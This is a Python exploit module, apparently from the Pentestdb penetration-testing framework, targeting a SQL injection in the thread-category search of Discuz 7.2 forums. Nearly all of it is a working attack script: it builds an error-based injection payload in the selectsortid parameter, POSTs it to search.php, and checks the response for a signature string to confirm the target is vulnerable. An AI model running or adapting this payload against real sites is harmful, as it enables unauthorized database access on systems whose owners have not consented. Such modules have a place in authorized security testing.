#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2014-2015 alpha1e0
'''

from script.exploit import Exploit, Result


class DiscuzSI(Exploit):
    expName = u"Discuz 7.2 主题分类 SQL注入"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "discuz"
    appVersion = "7.x"
    reference = ['http://www.wooyun.org/bugs/wooyun-2014-068707']
    description = u'''
        漏洞利用条件：1.Discuz 7.2，2.开启主题分类
    '''

    def verify(self):
        result = Result()

        sig = '2c1743a391305fbf367df8e4f069f9f9'
        payload = {
            "formhash":"04949b0", 
            "srchtxt":"aa", 
            "srchtype":"threadsort", 
            "st":"on",
            "sortid":"3", 
            "selectsortid": "3 and (select 1 from (select count(*),concat({0},floor(rand(0)*2))x from information_schema.tables group by x)a)#".format(sig),
            "searchsubmit":"true"
        }

        try:
            #response = self.http.post(self.urlJoin(self.host,"search.php"), data=payload)
            url = self.url.split("?")[0]
            i = url.rfind("/")
            url = url[0:i] + "/search.php"
            print "debug>>>>>>>>>>>>>",url
            response = self.http.post(url, data=payload)
        except self.http.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        if response.status_code==200:
            if sig in response.content and "SQL" in response.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = response.request.body
                result['VerifyInfo']['Payload'] = response.request.body

        return result

